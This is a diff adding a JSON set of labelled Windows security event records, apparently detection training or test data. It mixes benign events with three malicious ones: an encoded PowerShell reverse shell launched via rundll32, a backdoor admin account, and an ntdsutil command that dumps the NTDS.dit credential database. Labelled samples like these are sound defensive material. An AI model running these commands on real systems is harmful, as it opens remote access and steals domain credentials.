@@ -1,0 +1,79 @@
+[
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-10-15T01:10:05.123Z",
+    "Computer": "DESKTOP-32GLMCG",
+    "Channel": "Security",
+    "Message": "A new process has been created.",
+    "EventData": {
+      "SubjectUserName": "Shahy",
+      "SubjectUserSid": "S-1-5-21-4167025962-3852181576-963531634-1001",
+      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "cmd.exe /c powershell -ExecutionPolicy Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAIAACwAOAAwADgAMAApAA==",
+      "ParentProcessName": "C:\\Windows\\System32\\rundll32.exe"
+    },
+    "Category": "Malicious",
+    "Description": "Execution of an Encoded PowerShell Reverse Shell spawned from rundll32.exe"
+  },
+  {
+    "EventID": 4720,
+    "TimeCreated": "2026-10-15T01:12:40.450Z",
+    "Computer": "DESKTOP-32GLMCG",
+    "Channel": "Security",
+    "Message": "A user account was created.",
+    "EventData": {
+      "SubjectUserName": "Shahy",
+      "SubjectUserSid": "S-1-5-21-4167025962-3852181576-963531634-1001",
+      "TargetUserName": "ShadowAdmin",
+      "TargetSid": "S-1-5-21-4167025962-3852181576-963531634-1005",
+      "PrivilegeList": "-"
+    },
+    "Category": "Malicious",
+    "Description": "Unauthorized local backdoor user account creation for persistence"
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-10-15T01:15:22.890Z",
+    "Computer": "DESKTOP-32GLMCG",
+    "Channel": "Security",
+    "Message": "A new process has been created.",
+    "EventData": {
+      "SubjectUserName": "SYSTEM",
+      "SubjectUserSid": "S-1-5-18",
+      "NewProcessName": "C:\\Windows\\System32\\ntdsutil.exe",
+      "CommandLine": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\NTDS\" q q",
+      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+    },
+    "Category": "Malicious",
+    "Description": "Credential Dumping via NTDS.dit database extraction (IFM method)"
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-10-15T01:20:00.112Z",
+    "Computer": "DESKTOP-32GLMCG",
+    "Channel": "Security",
+    "Message": "A new process has been created.",
+    "EventData": {
+      "SubjectUserName": "Shahy",
+      "SubjectUserSid": "S-1-5-21-4167025962-3852181576-963531634-1001",
+      "NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
+      "ParentProcessName": "C:\\Windows\\explorer.exe"
+    },
+    "Category": "Normal",
+    "Description": "Standard user launching Google Chrome browser from Windows Explorer"
+  },
+  {
+    "EventID": 7036,
+    "TimeCreated": "2026-10-15T01:22:15.600Z",
+    "Computer": "DESKTOP-32GLMCG",
+    "Channel": "System",
+    "Message": "The Windows Update service entered the running state.",
+    "EventData": {
+      "ServiceName": "Windows Update",
+      "ServiceState": "running"
+    },
+    "Category": "Normal",
+    "Description": "Routine Windows system service state change (wuauserv)"
+  }
+]
